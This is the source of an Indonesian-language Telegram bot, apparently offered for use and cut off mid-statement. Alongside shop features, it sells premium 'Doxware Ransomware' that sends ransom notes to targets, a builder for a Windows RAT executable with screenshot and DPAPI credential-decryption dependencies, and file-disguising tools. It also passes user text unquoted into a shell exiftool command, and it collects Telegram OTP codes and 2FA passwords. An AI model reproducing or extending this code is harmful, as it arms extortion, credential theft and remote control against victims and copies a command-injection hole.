const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require("path");
const mongoose = require('mongoose');
const axios = require('axios');
const config = require("./config");
const User = require('./models/user');
const Product = require('./models/product');
const Rat = require('./models/rat');
const Category = require('./models/category');
const Transaction = require('./models/transaction');
const Userbot = require('./models/userbot');
const { TDL } = require('@telepilotco/tdl');
const moment = require("moment");
const { exec } = require('child_process');
const crypto = require('crypto');
const TrackedLink = require('./models/trackedLink');
const QRCode = require('qrcode');
const Jimp = require('jimp');
const { createInlineKeyboard, isAdmin, sendStartMessage, showProductDetail, sendAwanStartMessage } = require('./utils');
const awanPremiumHandler = require('./commands/awan_premium');
const DoxwareSimulation = require('./models/doxwareSimulation');
const natural = require('natural');
const { sendAkun } = require('./unchek');

const bot = new TelegramBot(config.botToken, { polling: true });

// Command logic will be handled directly in the message listener.

const wishlists = {};
const carts = {};
const userbotSessions = {};
const userStates = {};

function saveData() {
    fs.writeFileSync("wishlists.json", JSON.stringify(wishlists));
    fs.writeFileSync("carts.json", JSON.stringify(carts));
}

function loadData() {
    try {
        const wishlistsData = fs.readFileSync("wishlists.json", "utf8");
        Object.assign(wishlists, JSON.parse(wishlistsData));
    } catch (e) {
        console.warn("Gagal memuat wishlists:", e.message);
    }
    try {
        const cartsData = fs.readFileSync("carts.json", "utf8");
        Object.assign(carts, JSON.parse(cartsData));
    } catch (e) {
        console.warn("Gagal memuat carts:", e.message);
    }
}

loadData();

function createNavigationKeyboard(currentIndex, totalItems, prefix) {
  const buttons = [];
  if (currentIndex > 0) {
    buttons.push({ text: "Prev", callback_data: `${prefix}_prev` });
  }
  if (currentIndex < totalItems - 1) {
    buttons.push({ text: "Next", callback_data: `${prefix}_next` });
  }
  return createInlineKeyboard(buttons);
}

async function isGroupAdmin(bot, chatId, userId) {
    try {
        const chatMember = await bot.getChatMember(chatId, userId);
        return chatMember.status === 'creator' || chatMember.status === 'administrator';
    } catch (error) {
        console.error("Gagal mendapatkan info chat member:", error.message);
        return false;
    }
}

async function isGroupOwner(bot, chatId, userId) {
    try {
        const chatMember = await bot.getChatMember(chatId, userId);
        return chatMember.status === 'creator';
    } catch (error) {
        console.error("Gagal mendapatkan info chat member:", error.message);
        return false;
    }
}

function generateRecaptchaCode() {
  return Math.floor(Math.random() * 1000);
}

const newGroupMembers = {};
const welcomeMessages = {};

const mutedUsers = {};

const escapeMarkdown = (text) => {
    if (!text) return '';
    return text.replace(/[_*[\]()~`>#+-=|{}.!]/g, '\\$&');
};

let tdlibClient;
let TDLIB_INITIALIZED = false;

bot.on("new_chat_members", (msg) => {
  const chatId = msg.chat.id;
  if (msg.chat.type === "group" || msg.chat.type === "supergroup") {
    msg.new_chat_members.forEach((user) => {
      if (!user.is_bot) {
        const recaptchaCode = generateRecaptchaCode();
        newGroupMembers[chatId] = newGroupMembers[chatId] || {};
        newGroupMembers[chatId][user.id] = recaptchaCode;
        bot.sendMessage(
          chatId,
          `Selamat datang, ${user.first_name}! Silakan ketik kode berikut dalam 5 menit:\n\n*${recaptchaCode}*`,
          { parse_mode: "Markdown" }
        );
      }
    });
    if (welcomeMessages[chatId]) {
      bot.sendMessage(chatId, welcomeMessages[chatId]);
    }
  }
});

bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;

    const state = userStates[chatId];

    // --- Userbot Login State Machine ---
    if (state && state.action === 'userbot_awaiting_phone') {
        const phoneNumber = text.trim();
        if (!phoneNumber.startsWith('+')) {
            return bot.sendMessage(chatId, "Format nomor telepon tidak valid. Harap gunakan format internasional (contoh: `+628123456789`).");
        }
        try {
            await bot.sendMessage(chatId, `⏳ Memulai sesi untuk ${phoneNumber}... Mohon tunggu.`);
            console.log(`[TDLIB_DEBUG] Using apiId: ${config.apiId} (type: ${typeof config.apiId})`);
            console.log(`[TDLIB_DEBUG] Using apiHash: ${config.apiHash} (type: ${typeof config.apiHash})`);

            const clientOptions = {
                apiId: parseInt(config.apiId, 10),
                apiHash: config.apiHash,
                databaseDirectory: `_td_database_${chatId}`,
                filesDirectory: `_td_files_${chatId}`,
            };

            const client = new TDL(clientOptions);

            client.on('update', async (update) => {
                if (update['@type'] === 'updateAuthorizationState') {
                    const authState = update.authorization_state;
                    if (authState['@type'] === 'authorizationStateWaitTdlibParameters') {
                        await client.send({ '@type': 'setTdlibParameters', parameters: {} });
                    } else if (authState['@type'] === 'authorizationStateWaitEncryptionKey') {
                        await client.send({ '@type': 'checkDatabaseEncryptionKey' });
                    } else if (authState['@type'] === 'authorizationStateWaitCode') {
                        userStates[chatId].action = 'userbot_awaiting_code';
                        await bot.sendMessage(chatId, "Langkah 2: Masukkan kode OTP yang Anda terima di Telegram.");
                    } else if (authState['@type'] === 'authorizationStateWaitPassword') {
                        userStates[chatId].action = 'userbot_awaiting_password';
                        await bot.sendMessage(chatId, "Langkah 3: Akun Anda dilindungi oleh Verifikasi Dua Langkah. Masukkan kata sandi Anda.");
                    } else if (authState['@type'] === 'authorizationStateReady') {
                        tdlibClients[chatId] = client;
                        delete userStates[chatId];
                        let userbot = await Userbot.findOne({ userId: chatId });
                        if (userbot) {
                            return bot.sendMessage(chatId, "Anda sudah memiliki userbot aktif.");
                        }
                        userbot = new Userbot({
                            userId: chatId,
                            phoneNumber: phoneNumber,
                            trialExpiry: moment().add(7, 'days').toDate(),
                            isActive: true,
                        });
                        await userbot.save();
                        await bot.sendMessage(chatId, "✅ Selamat! Userbot trial Anda berhasil diaktifkan selama 7 hari.");
                        await client.close();
                    } else if (authState['@type'] === 'authorizationStateClosing' || authState['@type'] === 'authorizationStateClosed') {
                         console.log(`TDLib client for ${chatId} is closing or closed.`);
                         delete tdlibClients[chatId];
                    }
                }
            });
            client.on('error', (err) => {
                console.error(`TDLib error for ${chatId}:`, err);
                bot.sendMessage(chatId, `Terjadi kesalahan pada sesi TDLib. Silakan coba lagi. Error: ${err.message}`);
                delete userStates[chatId];
            });
            await client.connect();
            await client.send({ '@type': 'setAuthenticationPhoneNumber', phone_number: phoneNumber });
            tdlibClients[chatId] = client;
        } catch (error) {
            console.error(`Gagal memulai TDLib client untuk ${chatId}:`, error);
            bot.sendMessage(chatId, "Gagal memulai sesi userbot. Silakan coba lagi nanti.");
            delete userStates[chatId];
        }
        return;
    }
    if (state && state.action === 'userbot_awaiting_code') {
        const code = text.trim();
        const client = tdlibClients[chatId];
        if (client) {
            await bot.sendMessage(chatId, "Verifikasi kode...");
            await client.send({ '@type': 'checkAuthenticationCode', code: code });
        } else {
            bot.sendMessage(chatId, "Sesi login tidak ditemukan atau telah kedaluwarsa. Silakan mulai lagi dari /start.");
            delete userStates[chatId];
        }
        return;
    }
    if (state && state.action === 'userbot_awaiting_password') {
        const password = text.trim();
        const client = tdlibClients[chatId];
        if (client) {
            await bot.sendMessage(chatId, "Verifikasi kata sandi...");
            await client.send({ '@type': 'checkAuthenticationPassword', password: password });
        } else {
            bot.sendMessage(chatId, "Sesi login tidak ditemukan atau telah kedaluwarsa. Silakan mulai lagi dari /start.");
            delete userStates[chatId];
        }
        return;
    }

    if (state && state.action && state.action.startsWith('awaiting_registration_')) {
        if (state.action === 'awaiting_registration_email') {
            if (!/^\S+@\S+\.\S+$/.test(text)) {
                return bot.sendMessage(chatId, "Format email tidak valid. Silakan coba lagi.");
            }
            state.data.email = text.trim();
            state.action = 'awaiting_registration_username';
            await bot.sendMessage(chatId, "✅ Email diterima. Sekarang, masukkan username yang Anda inginkan:");
        } else if (state.action === 'awaiting_registration_username') {
            state.data.username = text.trim();
            state.action = 'awaiting_registration_age';
            await bot.sendMessage(chatId, "✅ Username diterima. Terakhir, berapa umur Anda?");
        } else if (state.action === 'awaiting_registration_age') {
            const age = parseInt(text, 10);
            if (isNaN(age) || age <= 0) {
                return bot.sendMessage(chatId, "Umur tidak valid. Harap masukkan angka yang benar.");
            }
            state.data.age = age;

            try {
                const newUser = new User({
                    chatId: chatId,
                    email: state.data.email,
                    username: state.data.username,
                    age: state.data.age,
                    type: msg.chat.type,
                    joinDate: moment().format(),
                    daftar: true
                });
                await newUser.save();
                await bot.sendMessage(chatId, `🎉 Pendaftaran berhasil! Selamat datang, ${state.data.username}!`);

                // Hapus state setelah selesai
                delete userStates[chatId];
                // Tampilkan menu utama setelah daftar
                sendStartMessage(bot, chatId, false, false, false);
            } catch (error) {
                if (error.code === 11000) { // Duplicate key error
                    await bot.sendMessage(chatId, "Email atau username ini sudah terdaftar. Silakan mulai lagi dengan /start dan gunakan data yang berbeda.");
                } else {
                    console.error("Gagal menyimpan pengguna baru:", error);
                    await bot.sendMessage(chatId, "Terjadi kesalahan saat menyimpan pendaftaran Anda. Mohon coba lagi.");
                }
                delete userStates[chatId];
            }
        }
        return;
    } else if (state && state.action && state.action.startsWith('awaiting_')) {
        const actionParts = state.action.split('_');
        const tool = actionParts[2];

        if (state.action === 'awaiting_link_qrcode' && text) {
            state.action = 'awaiting_alias_qrcode';
            state.originalLink = text;
            await bot.sendMessage(chatId, "✅ Tautan asli diterima. Sekarang, masukkan nama kustom (alias) yang Anda inginkan untuk tautan ini. Nama hanya boleh berisi huruf, angka, dan garis bawah (_).");
            return;
        } else if (state.action === 'awaiting_alias_qrcode' && text) {
            try {
                const alias = text.trim();
                // Validasi alias
                if (!/^[a-zA-Z0-9_]+$/.test(alias)) {
                    return bot.sendMessage(chatId, "❌ Format alias tidak valid. Harap gunakan hanya huruf, angka, dan garis bawah (_). Coba lagi.");
                }

                // Cek keunikan alias di database
                const existingLink = await TrackedLink.findOne({ alias: alias });
                if (existingLink) {
                    return bot.sendMessage(chatId, "❌ Nama alias ini sudah digunakan. Silakan pilih nama lain.");
                }

                await bot.sendMessage(chatId, `Alias "${alias}" tersedia. Membuat QR code pelacakan, mohon tunggu...`);

                const originalLink = state.originalLink;
                const coverFileId = state.coverFileId;
                const trackableUrl = `${config.botBaseUrl}/track/${alias}`;

                // Simpan ke database
                const newTrackedLink = new TrackedLink({
                    alias: alias,
                    creatorChatId: chatId,
                    originalLink: originalLink
                });
                await newTrackedLink.save();

                const tempDir = path.join(__dirname, 'temp', chatId.toString());
                if (!fs.existsSync(tempDir)) {
                    fs.mkdirSync(tempDir, { recursive: true });
                }
                const coverPath = path.join(tempDir, 'cover.jpg');
                const qrPath = path.join(tempDir, 'qr.png');
                const outputPath = path.join(tempDir, 'output_qr.jpg');

                const coverLink = await bot.getFileLink(coverFileId);
                await downloadFile(coverLink, coverPath);

                try {
                    await QRCode.toFile(qrPath, trackableUrl);

                    const coverImage = await Jimp.read(coverPath);
                    const qrImage = await Jimp.read(qrPath);

                    const qrResized = qrImage.resize(coverImage.getWidth() / 4, Jimp.AUTO);

                    coverImage.composite(qrResized,
                        coverImage.getWidth() - qrResized.getWidth() - 20,
                        coverImage.getHeight() - qrResized.getHeight() - 20
                    );

                    await coverImage.writeAsync(outputPath);

                    await bot.sendPhoto(chatId, outputPath, {
                        caption: "Berikut adalah gambar Anda yang telah disisipi QR code pelacakan."
                    });

                } catch (err) {
                    console.error("Gagal membuat atau menyisipkan QR code:", err);
                    bot.sendMessage(chatId, 'Gagal memproses QR code.');
                } finally {
                    fs.rmSync(tempDir, { recursive: true, force: true });
                    delete userStates[chatId];
                }

            } catch (e) {
                console.error("Gagal dalam proses qrcode:", e);
                bot.sendMessage(chatId, "Terjadi kesalahan fatal. Silakan coba lagi.");
                delete userStates[chatId];
            }
            return; // Hentikan pemrosesan lebih lanjut untuk pesan ini
        } else if (state.action === 'awaiting_metadata_exiftool' && text) {
            try {
                await bot.sendMessage(chatId, "Metadata diterima. Menerapkannya ke gambar, mohon tunggu...");
                const metadata = text; // "Author:Jules, Comment:File Rahasia"
                const coverFileId = state.coverFileId;

                const tempDir = path.join(__dirname, 'temp', chatId.toString());
                if (!fs.existsSync(tempDir)) {
                    fs.mkdirSync(tempDir, { recursive: true });
                }
                const coverPath = path.join(tempDir, 'cover_exif.jpg');
                const coverLink = await bot.getFileLink(coverFileId);
                await downloadFile(coverLink, coverPath);

                // Hapus file asli setelah exiftool membuat backup
                const originalFileBackup = `${coverPath}_original`;

                const metadataArgs = metadata.split(',').map(part => {
                    const [key, ...valueParts] = part.split(':');
                    const value = valueParts.join(':').trim();
                    return `-ExifTool:${key.trim()}="${value}"`;
                }).join(' ');

                const command = `exiftool -overwrite_original ${metadataArgs} "${coverPath}"`;
                exec(command, async (error, stdout, stderr) => {
                    if (error) {
                        console.error(`ExifTool Error: ${stderr}`);
                        bot.sendMessage(chatId, 'Gagal menulis metadata. Pastikan formatnya benar (key:value, key2:value2).');
                        fs.rmSync(tempDir, { recursive: true, force: true });
                        delete userStates[chatId];
                        return;
                    }

                    await bot.sendDocument(chatId, coverPath, {}, {
                        caption: "Berikut adalah gambar Anda yang telah diupdate metadatanya."
                    });

                    fs.rmSync(tempDir, { recursive: true, force: true });
                    delete userStates[chatId];
                });

            } catch (e) {
                console.error("Gagal dalam proses exiftool:", e);
                bot.sendMessage(chatId, "Terjadi kesalahan fatal. Silakan coba lagi.");
                delete userStates[chatId];
            }
            return;
        } else if (state.action === 'doxware_awaiting_filename' && text) {
            if (text.startsWith('/')) { // Ignore commands
                bot.sendMessage(chatId, "Proses dibatalkan karena Anda memasukkan perintah.");
                delete userStates[chatId];
                return;
            }
            userStates[chatId].fileName = text.trim();
            userStates[chatId].action = 'doxware_awaiting_key';
            await bot.sendMessage(chatId, `✅ Nama file diatur ke \`${text.trim()}\`.\n\nLangkah 2: Sekarang, masukkan kata kunci rahasia (kunci dekripsi). Target akan membutuhkan kunci ini untuk 'memulihkan' file mereka.`);
            return;
        } else if (state.action === 'doxware_awaiting_key' && text) {
            if (text.startsWith('/')) { // Ignore commands
                bot.sendMessage(chatId, "Proses dibatalkan karena Anda memasukkan perintah.");
                delete userStates[chatId];
                return;
            }
            const simulationId = crypto.randomBytes(8).toString('hex');

            try {
                const newSimulation = new DoxwareSimulation({
                    simulationId: simulationId,
                    creatorChatId: chatId,
                    fileName: userStates[chatId].fileName,
                    decryptionKey: text.trim(),
                    status: 'pending'
                });
                await newSimulation.save();

                const payloadCommand = `/start_simulation ${simulationId}`;

                await bot.sendMessage(chatId, `✅ **Pengaturan Selesai!**\n\n` +
                    `Anda telah dibuat dengan ID: \`${simulationId}\`\n\n` +
                    `Langkah 3: Berikan perintah berikut kepada target Anda untuk menjalankan simulasi:\n\n` +
                    `\`${payloadCommand}\`\n\n` +
                    `Saya akan memberitahu Anda ketika target telah menjalankan perintah tersebut.`);

            } catch (error) {
                console.error("Gagal membuat  doxware:", error);
                bot.sendMessage(chatId, "Terjadi kesalahan saat membuat Silakan coba lagi.");
            } finally {
                delete userStates[chatId]; // Clean up the state
            }
            return;
        } else if (state.action.startsWith('doxware_awaiting_ransom_note_') && text) {
            if (text.startsWith('/')) { // Ignore commands
                bot.sendMessage(chatId, "Proses dibatalkan karena Anda memasukkan perintah.");
                delete userStates[chatId];
                return;
            }

            const simulationId = state.action.split('_')[4];
            const simulation = await DoxwareSimulation.findOne({ simulationId: simulationId });

            if (!simulation) {
                bot.sendMessage(chatId, " tidak lagi valid atau telah kedaluwarsa.");
                delete userStates[chatId];
                return;
            }

            const victimChatId = simulation.victimChatId;
            const ransomNote = text;

            // Send the ransom note to the victim
            const noteMessage = `
=========================
    **PESAN PENTING**
=========================

${ransomNote}
`;
            await bot.sendMessage(victimChatId, noteMessage, { parse_mode: 'Markdown' });

            // Update simulation with the note
            simulation.ransomNote = ransomNote;
            await simulation.save();

            // Confirm to creator
            await bot.sendMessage(chatId, "✅ Pesan tebusan berhasil dikirim ke target.");
            delete userStates[chatId]; // Clean up state
            return;
        } else if (state.action.startsWith('awaiting_quantity_')) {
            const item = state.action.replace('awaiting_quantity_', '');
            const quantity = parseInt(text, 10);
            if (isNaN(quantity) || quantity <= 0) {
                return bot.sendMessage(chatId, "Jumlah tidak valid. Harap masukkan angka yang benar.");
            }

            sendAkun(bot, chatId, item, quantity);
            delete userStates[chatId];
            return;
        }
    }


    // --- Consolidated Command Handling ---
    if (text && text.startsWith('/')) {
        const match = text.match(/\/([a-zA-Z0-9_]+)(?: (.+))?/);
        if (!match) return; // Not a valid command format

        const command = match[1];
        const args = match[2];

        if (command === 'start') {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const startPayload = args;

            try {
                const user = await User.findOne({ chatId });

                // Jika pengguna tidak ada, mulai alur pendaftaran
                if (!user) {
                    userStates[chatId] = { action: 'awaiting_registration_email', data: {} };
                    await bot.sendMessage(chatId, "👋 Selamat datang! Sepertinya Anda pengguna baru. Mari kita daftar.\n\nSilakan masukkan alamat email Anda:");
                } else {
                    // Jika pengguna sudah ada
                    if (startPayload === 'awan') {
                        if (user.isPremium) {
                            sendAwanStartMessage(bot, chatId);
                        } else {
                            bot.sendMessage(chatId, "Fitur 'awan' hanya untuk pengguna premium.");
                        }
                    } else if (startPayload) {
                        showProductDetail(bot, chatId, startPayload);
                    } else {
                        sendStartMessage(bot, chatId, isAdmin(userId), false, user.isPremium);
                    }
                }
            } catch (error) {
                console.error("Gagal menangani /start:", error);
                bot.sendMessage(chatId, "Terjadi kesalahan saat memproses perintah.");
            }
            return; // End command processing
        }

        if (command === 'start_simulation') {
            const chatId = msg.chat.id;
            const simulationId = args;

            if (!simulationId) {
                return; // Ignore if no ID is provided
            }
            try {
                const simulation = await DoxwareSimulation.findOne({ simulationId: simulationId.trim() });
                if (!simulation) {
                    return bot.sendMessage(chatId, "ID Simulasi tidak valid atau telah kedaluwarsa.");
                }
                if (simulation.creatorChatId === chatId) {
                    return bot.sendMessage(chatId, "Anda tidak dapat menjalankan simulasi yang Anda buat sendiri pada diri sendiri.");
                }
                if (simulation.status !== 'pending') {
                    return bot.sendMessage(chatId, "Simulasi ini sudah berjalan atau telah selesai.");
                }
                simulation.victimChatId = chatId;
                simulation.status = 'connected';
                await simulation.save();
                await bot.sendMessage(chatId, `Berhasil menjalankan \`${simulation.fileName}\`. Tidak ada tindakan lebih lanjut yang diperlukan.`);
                const creatorChatId = simulation.creatorChatId;
                const victimUsername = msg.from.username ? `@${msg.from.username}` : `ID: ${chatId}`;
                const notificationMessage = `✅ **Doxware Connected!**\n\nTarget (${victimUsername}) telah menjalankan \`${simulation.fileName}\`.\n\nAnda sekarang dapat melanjutkan untuk 'mengenkripsi' data mereka.`;
                const keyboard = createInlineKeyboard([
                    { text: "🔐 Enkripsi Data Target", callback_data: `doxware_encrypt_${simulation.simulationId}` }
                ]);
                await bot.sendMessage(creatorChatId, notificationMessage, {
                    parse_mode: 'Markdown',
                    reply_markup: keyboard
                });
            } catch (error) {
                console.error("Gagal menangani /start_simulation:", error);
                bot.sendMessage(chatId, "Terjadi kesalahan saat memproses simulasi.");
            }
            return; // End command processing
        }

        if (command === 'listuser') {
            const chatId = msg.chat.id;
            const userId = msg.from.id;

            if (!isAdmin(userId)) {
                return bot.sendMessage(chatId, "Maaf, perintah ini hanya untuk Admin.");
            }

            try {
                const users = await User.find({});
                if (users.length === 0) {
                    return bot.sendMessage(chatId, "Tidak ada pengguna yang terdaftar di database.");
                }
                bot.sendMessage(chatId, `Menyiapkan daftar ${users.length} pengguna...`);

                for (const user of users) {
                    if (!user.chatId) {
                        console.log(`Melewatkan pengguna karena chatId tidak valid: ${user._id}`);
                        continue;
                    }
                    const username = escapeMarkdown(user.username ? `@${user.username}` : 'Tidak ada');
                    const premiumStatus = user.isPremium ? '✅ Premium' : '❌ Belum Premium';

                    let userText = `👤 *Info Pengguna*\n\n`;
                    userText += `**User ID:** \`${user._id}\`\n`;
                    userText += `**Username:** ${username}\n`;
                    userText += `**Chat ID:** \`${user.chatId}\`\n`;
                    userText += `**Status:** ${premiumStatus}`;

                    const keyboard = {
                        inline_keyboard: [
                            [
                                user.isPremium
                                    ? { text: "Hapus Premium", callback_data: `remove_premium_${user.chatId}` }
                                    : { text: "Jadikan Premium", callback_data: `add_premium_${user.chatId}` }
                            ]
                        ]
                    };
                    await bot.sendMessage(chatId, userText, { parse_mode: 'Markdown', reply_markup: keyboard });
                }
            } catch (error) {
                console.error("Gagal menjalankan perintah /listuser:", error);
                bot.sendMessage(chatId, "Terjadi kesalahan saat mengambil daftar pengguna.");
            }
            return; // End command processing
        }
    }

    // Other message handlers
    if (mutedUsers[chatId] && mutedUsers[chatId][userId]) {
        bot.deleteMessage(chatId, msg.message_id);
        return;
    }

    if (text && text.length > 500) {
        bot.deleteMessage(chatId, msg.message_id);
        bot.sendMessage(chatId, `Pesan dari ${msg.from.first_name} dihapus karena terlalu panjang.`);
        return;
    }

    const forbiddenWords = ["jelek", "bodoh", "gila"];
    if (text && forbiddenWords.some(word => text.toLowerCase().includes(word))) {
        bot.deleteMessage(chatId, msg.message_id);
        bot.sendMessage(chatId, `Pesan dari ${msg.from.first_name} dihapus karena mengandung kata-kata yang tidak pantas.`);
        return;
    }

    if (newGroupMembers[chatId] && newGroupMembers[chatId][userId]) {
        const recaptchaCode = newGroupMembers[chatId][userId];
        if (parseInt(text) === recaptchaCode) {
            delete newGroupMembers[chatId][userId];
            bot.sendMessage(chatId, `Selamat, Anda telah lolos verifikasi!`);
        } else {
            bot.kickChatMember(chatId, userId);
            bot.sendMessage(chatId, `Kode reCAPTCHA salah. Anda dikeluarkan dari grup.`);
        }
        return;
    }
});

bot.onText(/\/setwelcome (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const isOwner = isAdmin(userId) || (msg.chat.type !== 'private' && await isGroupOwner(bot, chatId, userId));
    if (!isOwner) return bot.sendMessage(chatId, "Anda tidak memiliki izin.");

    const welcomeText = match[1].trim();
    welcomeMessages[chatId] = welcomeText;
    bot.sendMessage(chatId, "Pesan selamat datang telah diatur.");
});
//PLACEHOLDER  TDLIB GLOBAL

async function initializeTDLibClient() {
   //  PLACEHOLDER replace with Tdlib Init library
// TDLIB_INITIALIZED  =
        try {
             console.log("Initializing TDLib client...");
        } catch (error) {
            console.error("Gagal inisialisasi TDLib:", error);
        }

}

async function initializeTDLibClient(apiId, apiHash) {
  if (tdlibClient) {
    return tdlibClient;
  }
  console.log("Tipe apiId:", typeof apiId);
  const client = new TDL({
    apiId: apiId, // Hardcoded for testing
    apiHash: apiHash,
    databaseDirectory: `_td_database_${apiId}`,
    filesDirectory: `_td_files_${apiId}`,
  });

  await client.connect();
  tdlibClient = client;
  return client;
}

/*
    if (TDLIB_INITIALIZED){
  This example implement use that if has a client that user logined before
   function getPhoneNUmberClient for the login user
      TDLIB_AUTH_FUNCTIONS
}
*/

bot.on("callback_query", async (query) => {
  const chatId = query.message ? query.message.chat.id : query.from.id;
  if (!query.message && query.data.includes('doxware')) {
      return bot.answerCallbackQuery(query.id, { text: 'Pesan ini sudah terlalu lama untuk di-update. Silakan panggil kembali menu.', show_alert: true });
  }
  const userId = query.from.id;
  const data = query.data;

  try {
    if (data === "product") showCategories(chatId);
    else if (data === "register") registerUser(chatId, userId);
    else if (data === "profile") showUserProfile(chatId, userId);
    else if (data.startsWith("category_")) {
      const categoryName = data.split("_")[1];
      showProductsByCategory(chatId, categoryName, 0);
    } else if (data.startsWith("productlist_")) {
      const [prefix, categoryName, page] = data.split("_");
      showProductsByCategory(chatId, categoryName, parseInt(page));
    } else if (data.startsWith("product_")) {
      const productId = data.split("_")[1];
      showProductDetail(bot, chatId, productId);
    } else if (data === "back_to_categories") showCategories(chatId);
        else if (data === "back_to_start") sendStartMessage(bot, chatId, isAdmin(userId), userbotSessions[chatId] != null);
    else if (data === "deposit_midtrans") showMidtransPaymentOptions(chatId);
    else if (data === "deposit_qris") bot.sendPhoto(chatId, config.qrisImagePath, { caption: "Silakan transfer ke QRIS, kirim bukti dengan /send." });
    else if (data === "midtrans_gopay") handleMidtransDeposit(chatId, userId, "gopay");
    else if (data === "midtrans_qris") handleMidtransDeposit(chatId, userId, "qris");
    else if (data.startsWith("buy_")) {
      const productId = data.split("_")[1];
      handleBuyProduct(chatId, userId, productId);
    } else if (data === "transaction_history") showTransactionHistory(chatId, userId);
    else if (data.startsWith("wishlist_")) {
        const action = data.split("_")[1];
        const productId = data.split("_")[2];
        if (action === "add") handleAddToWishlist(chatId, userId, productId);
        else if (action === "remove") handleRemoveFromWishlist(chatId, userId, productId);
    } else if (data === "wishlist") showWishlist(chatId, userId);
    else if (data.startsWith("cart_")) {
        const action = data.split("_")[1];
        const productId = data.split("_")[2];
        if (action === "add") handleAddToCart(chatId, userId, productId);
        else if (action === "remove") handleRemoveFromCart(chatId, userId, productId);
    } else if (data === "cart") showCart(chatId, userId);
       else if (data === "all_menu") showAllMenu(chatId, isAdmin(userId),  userbotSessions[chatId] != null);
    else if (data === "claim_trial_userbot") claimTrialUserbot(chatId);
    else if (data === "admin_menu") showAdminMenu(chatId);
    else if (data.startsWith("add_premium_")) {
        if (!isAdmin(userId)) {
            return bot.answerCallbackQuery(query.id, { text: 'Perintah ini hanya untuk admin.', show_alert: true });
        }

        const targetChatIdStr = data.split("_")[2];
        if (!targetChatIdStr || isNaN(parseInt(targetChatIdStr))) {
            return bot.answerCallbackQuery(query.id, { text: 'Callback data tidak valid.', show_alert: true });
        }
        const targetChatId = parseInt(targetChatIdStr);

        try {
            const updatedUser = await User.findOneAndUpdate(
                { chatId: targetChatId },
                { $set: { isPremium: true } },
                { new: true }
            );

            if (updatedUser) {
                await bot.answerCallbackQuery(query.id, { text: `Pengguna ${updatedUser.username || targetChatId} telah dijadikan premium.` });
                await bot.sendMessage(chatId, `✅ Berhasil! Pengguna @${updatedUser.username || targetChatId} sekarang adalah anggota premium.`);
                await bot.sendMessage(targetChatId, "🎉 Selamat! Akun Anda telah ditingkatkan menjadi Premium. Anda sekarang memiliki akses ke fitur-fitur eksklusif.");
            } else {
                await bot.answerCallbackQuery(query.id, { text: 'Gagal menemukan pengguna.', show_alert: true });
            }
        } catch (error) {
            if (error.response && error.response.statusCode === 403) {
                console.warn(`Gagal mengirim pesan premium ke user ${targetChatId} karena bot diblokir.`);
                await bot.answerCallbackQuery(query.id, { text: `Pengguna ${targetChatId} telah dijadikan premium, tetapi bot diblokir.`, show_alert: true });
            } else {
                console.error("Gagal menjadikan pengguna premium:", error);
                await bot.answerCallbackQuery(query.id, { text: 'Terjadi kesalahan.', show_alert: true });
            }
        }
    }
    else if (data === "premium_menu") {
        const user = await User.findOne({ chatId: userId });
        if (!user || !user.isPremium) {
            const nonPremiumText = "Fitur ini hanya untuk Pengguna Premium.\nSilakan hubungi admin @maverick_dark atau gunakan perintah /feedback untuk meminta akses premium.";
            return bot.answerCallbackQuery(query.id, { text: nonPremiumText, show_alert: true });
        }

        const premiumMessage = "Selamat datang di Menu Premium! Pilih alat yang ingin Anda gunakan:";
        const premiumButtons = [
            { text: "🎓 Doxware Ransomware", callback_data: "doxware_simulation_start" },
            { text: "🖼️ Steghide (Embed File)", callback_data: "steg_steghide" },
            { text: "✍️ ExifTool (Edit Metadata)", callback_data: "steg_exiftool" },
            { text: "🗜️ Zip & Rename (Samarkan Arsip)", callback_data: "steg_zip" },
            { text: "🔗 QR Code (Embed Link)", callback_data: "steg_qrcode" },
            { text: "⬅️ Kembali", callback_data: "back_to_start" }
        ];

        await bot.editMessageText(premiumMessage, {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: createInlineKeyboard(premiumButtons)
        });
    }
    else if (data.startsWith("remove_premium_")) {
        if (!isAdmin(userId)) {
            return bot.answerCallbackQuery(query.id, { text: 'Perintah ini hanya untuk admin.', show_alert: true });
        }

        const targetChatIdStr = data.split("_")[2];
        if (!targetChatIdStr || isNaN(parseInt(targetChatIdStr))) {
            return bot.answerCallbackQuery(query.id, { text: 'Callback data tidak valid.', show_alert: true });
        }
        const targetChatId = parseInt(targetChatIdStr);

        try {
            const updatedUser = await User.findOneAndUpdate(
                { chatId: targetChatId },
                { $set: { isPremium: false } },
                { new: true }
            );

            if (updatedUser) {
                await bot.answerCallbackQuery(query.id, { text: `Pengguna ${updatedUser.username || targetChatId} telah dihapus dari premium.` });
                await bot.sendMessage(chatId, `✅ Berhasil! Pengguna @${updatedUser.username || targetChatId} sekarang bukan lagi anggota premium.`);
                await bot.sendMessage(targetChatId, "Status Premium Anda telah dicabut. Anda tidak lagi memiliki akses ke fitur premium.");
            } else {
                await bot.answerCallbackQuery(query.id, { text: 'Gagal menemukan pengguna.', show_alert: true });
            }
        } catch (error) {
            console.error("Gagal menghapus premium pengguna:", error);
            await bot.answerCallbackQuery(query.id, { text: 'Terjadi kesalahan.', show_alert: true });
        }
    }
    else if (data === 'awan_generate_desktop_rat') {
        bot.answerCallbackQuery(query.id);
        const user = await User.findOne({ chatId });
        if (!user || !user.isPremium) {
            return bot.sendMessage(chatId, "Fitur ini hanya untuk pengguna premium.");
        }

        const generatingMessage = await bot.sendMessage(chatId, "⏳ Memulai proses pembuatan executable... Ini mungkin memakan waktu beberapa menit.");

        const tempDir = path.join(__dirname, 'temp', `rat_${chatId}_${Date.now()}`);
        const outputExePath = path.join(tempDir, 'rat_client.exe');
        const tempScriptPath = path.join(tempDir, 'rat_client.js');
        const tempPackageJsonPath = path.join(tempDir, 'package.json');

        try {
            fs.mkdirSync(tempDir, { recursive: true });

            const ratPackageJson = {
                name: 'rat-client',
                version: '1.0.0',
                main: 'rat_client.js',
                dependencies: {
                    "node-telegram-bot-api": "^0.61.0",
                    "axios": "^1.10.0",
                    "screenshot-desktop": "^1.15.0",
                    "sqlite3": "^5.1.7",
                    "win-dpapi": "^1.1.2"
                }
            };
            fs.writeFileSync(tempPackageJsonPath, JSON.stringify(ratPackageJson, null, 2));

            const template = fs.readFileSync(path.join(__dirname, 'rat_client_template.js'), 'utf8');
            const finalScript = template
